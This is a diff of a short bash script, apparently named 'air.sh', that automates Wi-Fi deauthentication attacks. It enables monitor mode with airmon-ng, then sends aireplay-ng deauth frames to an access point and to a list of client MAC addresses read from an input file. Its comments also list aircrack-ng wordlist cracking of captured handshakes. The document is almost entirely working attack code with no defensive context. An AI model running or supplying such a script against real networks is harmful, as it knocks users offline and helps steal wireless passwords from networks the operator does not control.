@@ -6,20 +6,20 @@
 # aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon --ignore-negative-one
 # aircrack-ng <file.cap> -w <wordlist>
 
-#echo `date`
+# usage ./air.sh <input file>
+
 MON=`cat /sys/class/net/wlanXmon/operstate`
 if [ "$MON" != "unknown" ] ; then
         echo "$MON"
-        echo "enable mon"
+        echo "enabling mon"
         airmon-ng start wlanX
-#       airodump-ng -c 11 wlanXmon
+#       airodump-ng -c 11 wlanXmon #set channel
 fi
 
 echo "deauth"   
 aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c MAC wlanXmon
 
 while IFS='' read -r line || [[ -n "$line" ]]; do
-#       echo "text read from file: $line"
         aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c $line
 done < "$1"
 
